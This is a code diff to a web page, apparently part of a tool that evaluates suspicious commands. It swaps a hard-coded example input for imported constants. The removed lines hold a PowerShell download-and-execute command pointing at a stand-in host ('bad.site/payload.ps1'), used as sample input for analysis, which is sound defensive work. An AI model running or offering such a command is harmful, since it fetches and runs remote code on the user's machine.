@@ -10,6 +10,7 @@ import { ErrorMessage, InfoMessage } from "../components/Messages";
 import CommandInput from "../components/CommandInput";
 import ThemedButton from "../components/ThemedButton";
 import AnalysisChat from "../components/AnalysisChat";
+import { EXAMPLE_ENCODED_COMMAND, EXAMPLE_COMMAND_DESCRIPTION } from "../../constants/examples";
 
 export default function EvaluatePage() {
   const router = useRouter();
@@ -307,9 +308,9 @@ export default function EvaluatePage() {
             )}
 
             <InfoMessage
-              message={!error && command.length === 0 ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
+              message={!error && command.length === 0 ? EXAMPLE_COMMAND_DESCRIPTION : ""}
               clickable={!error && command.length === 0}
-              onClick={() => setCommand("IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")}
+              onClick={() => setCommand(EXAMPLE_ENCODED_COMMAND)}
             />
           </form>
         </div>
